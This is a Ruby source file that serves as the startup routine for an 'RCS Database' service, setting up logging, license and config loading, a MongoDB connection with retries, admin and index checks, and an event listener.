#
#  The main file of the db
#

# relatives
require_relative 'events'
require_relative 'config'
require_relative 'core'
require_relative 'license'
require_relative 'tasks'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class Application
  include RCS::Tracer
  extend RCS::Tracer

  def self.trace_setup
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml' then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end

    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')

    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
  end

  # the main of the collector
  def run(options)

    # initialize random number generator
    srand(Time.now.to_i)

    begin
      version = File.read(Dir.pwd + '/config/version.txt')
      trace :info, "Starting the RCS Database #{version}..."

      # load the license limits
      return 1 unless LicenseManager.instance.load_license

      # config file parsing
      return 1 unless Config.instance.load_from_file
      
      # connect to MongoDB
      until DB.instance.connect
        trace :warn, "Cannot connect to MongoDB, retrying..."
        sleep 5
      end
      
      # ensure the sharding is enabled
      DB.instance.enable_sharding

      # ensure at least one user (admin) is active
      DB.instance.ensure_admin

      # ensure we have the signatures for the agents
      DB.instance.ensure_signatures

      # ensure all indexes are in place
      DB.instance.create_indexes

      # enter the main loop (hopefully will never exit from it)
      Events.new.setup Config.instance.global['LISTENING_PORT']
      
    rescue Interrupt
      trace :info, "User asked to exit. Bye bye!"
      return 0
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.message
      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end

  # we instantiate here an object and run it
  def self.run!(*argv)
    self.trace_setup
    return Application.new.run(argv)
  end

end # Application::
end #DB::
end #RCS::
